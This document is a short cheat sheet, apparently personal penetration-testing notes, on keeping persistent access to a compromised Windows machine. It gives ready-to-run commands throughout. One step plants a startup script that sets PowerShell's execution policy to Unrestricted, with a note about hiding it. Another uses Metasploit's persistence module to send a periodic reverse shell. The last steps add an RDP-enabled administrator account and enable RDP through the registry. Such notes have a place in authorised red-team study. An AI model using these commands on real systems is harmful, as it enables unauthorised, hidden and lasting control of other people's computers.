# Persistence on Windows


# Launch Commands at startup
Create your .ps1 script and place it in a folder. I put it on my desktop for simplicity. The path would look something like this:
    C:\Users\<user_name>\Desktop\script.ps1
Create a .cmd file and place it in
    C:\Users\<user_name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd
Open the .cmd file with a text editor and enter the following lines:
    PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 3>&1
    PowerShell C:\Users\<user_name>\Desktop\script.ps1 >> "%TEMP%\StartupLog.txt" 2>&1
!! I SHOULD FIND A WAY TO RUN THIS HIDDEN!!

# Metasploit periodic reverse shell 
use exploit/windows/local/persistence
;; this module will send a payload every 10 seconds in default however you can set this time to anything you want
set session <session-id>

# Adding an RDP administrative account

## Add an administrative remote desktop enabled account
net user /add joe password1
net localgroup administrators joe /add
net localgroup "Remote Desktop Users" joe /add


# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable RDP (if needed)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
